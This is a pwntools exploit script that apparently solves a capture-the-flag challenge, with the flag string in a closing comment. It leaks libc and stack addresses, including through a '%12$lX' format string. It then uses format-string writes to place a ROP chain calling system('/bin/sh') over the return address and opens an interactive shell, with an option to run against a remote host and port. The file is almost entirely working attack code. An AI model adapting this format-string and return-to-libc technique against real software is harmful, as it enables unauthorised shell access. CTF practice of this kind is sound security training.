#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("34.70,212.151", 8002)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b'>>', b'1')
	r.recvuntil(b'0x')
	libc_leak = int(r.recvline().strip(), 16)
	success(f"{hex(libc_leak)=}")

	libc.address = libc_leak - libc.symbols['fgets']

	r.sendlineafter(b'>>', b'2')
	r.sendlineafter(b'>>', b'%12$lX')
	stack_leak = int(r.recvline().strip(), 16)
	success(f'{hex(stack_leak)=}')

	offset = 6
	ret_addr_leak = stack_leak - 0x8
	success(f'{hex(libc.address)=}')
	success(f'{hex(ret_addr_leak)=}')

	rop = ROP(libc)
	rop.raw(rop.find_gadget(['ret']).address)
	rop.system(next(libc.search(b'/bin/sh\x00')))
	payload = rop.chain()

	for i in range(len(payload)):
		r.sendlineafter(b'>>', b'2')
		writes = {ret_addr_leak+i: payload[i]}
		fmt_payload = fmtstr_payload(offset, writes, write_size='short')
		r.sendlineafter(b'>>', fmt_payload)

	r.sendlineafter(b'>>', b'3')

	r.interactive()


if __name__ == "__main__":
	main()

# flag{Wr17in6_w17h_f0rm47_5tr1ng_1s_fun}
